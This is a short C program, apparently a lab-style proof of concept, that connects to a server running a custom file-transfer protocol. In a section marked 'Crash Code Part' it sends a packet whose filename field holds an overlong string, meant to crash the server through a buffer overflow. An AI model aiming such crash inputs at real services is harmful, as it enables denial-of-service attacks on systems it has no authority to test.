/****************************************
 * compile : gcc -g -o crash crash.c    *
 * run : ./crash server_ip port_num     *
 ****************************************/

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include "sftp.h"

int main(int argc, char* argv[]) {
    int so, op;
    struct sockaddr_in remote_addr;
    struct sockaddr_in local_addr;
    Packet pkt;

    if(argc != 3) {
        printf("Usage: crash <ip_address> <port> \n");
        exit(-1);
    }
	
    bzero(&remote_addr, sizeof(struct sockaddr_in));
    bzero(&local_addr, sizeof(struct sockaddr_in));
	
    remote_addr.sin_family = AF_INET;
    remote_addr.sin_addr.s_addr = inet_addr(argv[1]);
    remote_addr.sin_port = htons(atoi(argv[2]));

    local_addr.sin_family = AF_INET;

    if ((so = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        printf("Failure in creating socket\n");
        exit(-1);
    }
	
    op = 1;

    if (setsockopt(so, SOL_SOCKET, SO_REUSEADDR, (char *) &op, sizeof(op)) < 0)      { 
        printf("Failure in setting socket options\n");
        exit(-1);
    }
    if (bind(so, (struct sockaddr*) &local_addr, sizeof(struct sockaddr_in)) < 0)   {
        printf("Failure in binding port\n");
        exit(-1);
    }
    if (connect(so, (struct sockaddr_in *) &remote_addr, sizeof(struct sockaddr_in)) < 0) {
        printf("Failure in connecting to %s\n", inet_ntoa(remote_addr.sin_addr));
        exit(-1);
    }

    /******************** Crash Code Part ********************/
strcpy(pkt.filename,"heloooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo");


    /******************** Crash Code Part ********************/

    send(so, (char *) &pkt, sizeof(Packet), 0);
    close(so);
}
